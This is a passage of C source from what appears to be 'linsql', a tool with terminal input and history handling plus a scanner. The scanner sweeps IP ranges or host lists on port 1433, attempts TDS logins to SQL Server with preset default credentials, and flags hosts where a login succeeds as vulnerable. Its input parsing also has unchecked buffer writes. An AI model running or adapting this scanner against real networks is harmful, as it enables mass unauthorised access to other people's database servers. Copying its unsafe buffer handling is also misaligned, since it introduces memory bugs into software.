	new_settings.c_cc[VMIN]=1;
	new_settings.c_cc[VTIME]=0;
	tcsetattr(fileno(stdin),TCSANOW, &new_settings);
	backSpaceSequence=tigetstr("cub1");
	cteol=tigetstr("dl1");
}

/*
 * this function gets a string from the keyboard
 * it can be from the command history or a fresh string just typed in
 * will eventually have line-editing capabilities
 */
int get_string(char *buffer, int maxCount)
{
	int currChar=0,ch, cmdNum;
		
	cmdNum=numCommands;
	memset(buffer,0,maxCount);
	
	do
	{
		ch=get_key();
		if(ch>0 &&ch!='\r'&&ch!='\n'&&isprint(ch))
		{
			buffer[currChar++]=ch;
			printf("%c",ch);
		}
		else
		if(ch==UPKEY)
		{
			if(cmdNum)
			{
				putp(cteol);
				while(currChar--)
				{
					putp(backSpaceSequence);
					printf(" ");
					putp(backSpaceSequence);
				}					
				memset(buffer,0,maxCount);
				cmdNum--;
				strcpy(buffer,commandBuf[cmdNum]);
				currChar=strlen(buffer);
				printf("%s",buffer);
			}
		}
		else
		if(ch==DOWNKEY)
		{
			if(cmdNum<numCommands-1)
			{
				putp(cteol);
				while(currChar--)
				{
					putp(backSpaceSequence);
					printf(" ");
					putp(backSpaceSequence);
				}
				memset(buffer,0,maxCount);
				cmdNum++;
				strcpy(buffer,commandBuf[cmdNum]);
				currChar=strlen(buffer);
				printf("%s",buffer);
			}
		}
		else
		{
			if(ch==BACKSPACE&&currChar)
			{
				putp(backSpaceSequence);
				printf(" ");
				putp(backSpaceSequence);
				currChar--;
				buffer[currChar]='\0';
			}
		}
	}while(ch!='\n'&&ch!='\r'&&currChar<maxCount);
	buffer[currChar]='\0';
	
	if(numCommands)
	{
		if(strcmp(commandBuf[numCommands-1], buffer)!=0)
		{
			commandBuf[numCommands]=(char *)malloc(MAX_INPUT_LEN);
			memset(commandBuf[numCommands],0,MAX_INPUT_LEN);
			strcpy(commandBuf[numCommands], buffer);
			numCommands++;
		}
	}
	else
	{
		commandBuf[numCommands]=(char *)malloc(MAX_INPUT_LEN);
		memset(commandBuf[numCommands],0,MAX_INPUT_LEN);
		strcpy(commandBuf[numCommands], buffer);
		numCommands++;
	}
		
	return 0;
}

/*
 * custom keyboard handler to read a character or a special key (up,down... whatever)
 */
int get_key()
{
	int ch;
	
	ch=fgetc(stdin);
	if(ch==0x1b)
	{
		fgetc(stdin);
		ch=fgetc(stdin);
		switch(ch)
		{
			case 'A':
				return UPKEY;
				break;
			case 'B':
				return DOWNKEY;
				break;
			case 'C':
			    return RIGHTKEY;
			    break;
			case 'D':
				return LEFTKEY;
				break;
			default:
				return 0;
		}
	}
	else
	if(ch==127||ch==8)
		return BACKSPACE;
	else
		return ch;
}

/*
 * this routine is a bit messy because:
 *
 * (a) It's not commented in any way...
 * (b) I needed to work around broken TDS libs which hang sometimes
 * (c) lots of timeout parameters are needed
 * (d) it's evolution, not design :) things just seem to keep getting added...
 *
 * nevertheless, it works and will scan a list of IP's for vulnerable hosts
 * I'll document the algorithm sometime soon
 */
void scan_hosts(char *iprange, int cTimeout, int pTimeout, char *givenName)
{
	char ipToScan[16], currOctet[4][2][4];	// currOctet[octet][from/to][digit] -- from=0 to=1
	int octetRange[4][2];				// octect [1.2.3.4][from-to]
	char *ptr, buf[3], processName[1024];
	int o1,o2,o3,o4,fromTo,o,digit,mySock,childPID,i,reset_yet=0,originalTimeout,status;
	struct sockaddr_in addr;
	FILE *fp;
	
	if((fp=fopen(iprange,"r"))!=NULL)						// is this a file containing a list of addresses?
	{														// if so, scan all hosts and return.
		scan_from_file(fp, cTimeout, pTimeout, givenName);
		fclose(fp);
		return;
	}
	
	ptr=iprange;
	fromTo=digit=o=0;
	originalTimeout=cTimeout;
	givenName=(char *)realloc(givenName, 100);
	while(*ptr!='\0'&&o<4)
	{
		fromTo=digit=0;
		while(*ptr!='.'&&*ptr!='\0')
		{
			if(isdigit(*ptr))
				currOctet[o][fromTo][digit++]=*(ptr++);
			else if(isalpha(*ptr))
			{
				print_it("IP addresses only... hostnames not supported for IP range scanning :)\nPerhaps I'll do zone transfers later...\nFor now, dump all the hostnames you want to scan into a file and use that as the input to this command.\n");
				exit(1);
			}
			else
			{
				if(*ptr=='-')
				{
					currOctet[o][fromTo][digit]='\0';
					fromTo++;
					digit=0;
					ptr++;
				}
				else
				{
					print_it("Invalid char\n");
					exit(1);
				}
			}			
		}
		currOctet[o][fromTo][digit]='\0';
		if(fromTo==0)
			strcpy(currOctet[o][1], currOctet[o][0]);
		o++;ptr++;digit=0;
	}

	for(o=0;o<4;o++)
		for(fromTo=0;fromTo<2;fromTo++)
			octetRange[o][fromTo]=atoi(currOctet[o][fromTo]);
		
	for(o1=octetRange[0][0];o1<=octetRange[0][1];o1++)
		for(o2=octetRange[1][0];o2<=octetRange[1][1];o2++)
			for(o3=octetRange[2][0];o3<=octetRange[2][1];o3++)
				for(o4=octetRange[3][0];o4<=octetRange[3][1];o4++)
				{
					sprintf(ipToScan,"%i.%i.%i.%i",o1,o2,o3,o4);
					print_it("Scanning %s",ipToScan);fflush(stdout);
					if((mySock=socket(AF_INET, SOCK_STREAM, 0))==-1)
					{
						print_it("Could not grab socket\n");
						exit(1);
					}
					addr.sin_family=AF_INET;
					addr.sin_addr.s_addr=inet_addr(ipToScan);
					addr.sin_port=htons(1433);
					scan_a_host(mySock, &addr, ipToScan, givenName, cTimeout, pTimeout);
					print_it("\n");
				}
}	

/*
 * check to see if a login to the given IP would succeed
 */
int probe_login(char *ip)
{
	strcpy(target.IP, ip);
	set_target_defaults();
	if((tds = tds_connect(login))!=NULL)
	{
	    tds_free_socket(tds);
		tds_free_login(login);
		return 1;
	}
	else
	{
		tds_free_login(login);
		return 0;
	}
}

/*
 * bulk scan from a file containing a list of IPs or hostnames. 
 */
void scan_from_file(FILE *ipFilePtr, int cTimeout, int pTimeout, char *givenName)
{
	char ipToScan[1024];
	int mySock;
	struct sockaddr_in addr;
	struct hostent *hostEntry;
	struct in_addr *inAddr;
	
	givenName=(char *)realloc(givenName, 100);
	while(!feof(ipFilePtr))
	{
		fgets(ipToScan, 1023, ipFilePtr);
		ipToScan[strlen(ipToScan)-1]='\0';
		print_it("Scanning %s [", ipToScan);fflush(stdout);
		if((hostEntry=gethostbyname(ipToScan))==NULL)
		{
			printf("Hostname lookup failed]\n");
			continue;
		}
		inAddr=(struct in_addr *)hostEntry->h_addr_list[0];
		printf("%s]",inet_ntoa(*inAddr));fflush(stdout);
		if((mySock=socket(AF_INET, SOCK_STREAM, 0))==-1)
		{
			print_it("Could not grab socket\n");
			exit(1);
		}
		addr.sin_family=AF_INET;
		addr.sin_addr.s_addr=inAddr->s_addr;
		addr.sin_port=htons(1433);
		scan_a_host(mySock, &addr, ipToScan, givenName, cTimeout, pTimeout);
		print_it("\n");
		close(mySock);
	}
}

/*
 * this does the actual scan of a target host, supporting time-out values etc,etc
 * was originally coded into the scan_hosts() function, but was migrated out due to the need for a scan-from-file routine
 */
void scan_a_host(int mySock, struct sockaddr_in *addr_in, char *ipToScan, char *givenName, int cTimeout, int pTimeout)
{
	int childPID,i,reset_yet=0,status;
	FILE *fp;
	char *ptr, buf[3];
	
	unlink(STATUS_FILE);
	if((childPID=fork())==0)
	{
		strncpy(givenName, "linsql probe process.....",100);
		if(!opt.test)
		if(connect(mySock, (struct sockaddr *)addr_in, sizeof(struct sockaddr_in))==0)
		{
			if((fp=fopen(STATUS_FILE,"w"))==NULL)
			{
				print_it("\nFailed to create status file\n");
				exit(1);
			}
			fwrite("OK",1,2,fp);
			fclose(fp);
			print_it("Target is listening, probing...");fflush(stdout);
			if(probe_login(ipToScan))
			{
				fp=fopen(STATUS_FILE,"w");
				print_it("VULNERABLE HOST");fflush(stdout);
				fwrite("VU",1,2,fp);
				fclose(fp);
			}
			exit(0);
		}
		else
		{
			if((fp=fopen(STATUS_FILE,"w"))==NULL)
			{
				print_it("\nFailed to create status file\n");
				exit(1);
			}
			fwrite("Failed",1,2,fp);
			fclose(fp);
		}
		exit(0);
	}
	else
	{					
		if(!opt.test)
		for(i=0;i<=cTimeout;i++)
		{
			if((fp=fopen(STATUS_FILE,"r"))==NULL)
				sleep(1);
			else
			{
				if(fgets(buf,3,fp)==buf)
				{
					if(strncmp(buf, "OK", 2)==0)
					{
						if(!reset_yet)
						{
							reset_yet=1;
							cTimeout=pTimeout;
							fclose(fp);
							unlink(STATUS_FILE);
						}
					}
					else
					if(strncmp(buf, "VU",2)==0)
					{
						fclose(fp);
						goto outOfHere;
					}
					else
						fclose(fp);
				}
				if(!reset_yet)
					break;
			}
			print_it(".",i);fflush(stdout);
		}
		outOfHere:
		kill(childPID, SIGTERM); // kill the child process, leaving a zombie...
		wait(&status); // ...then clean up the zombie
	}
}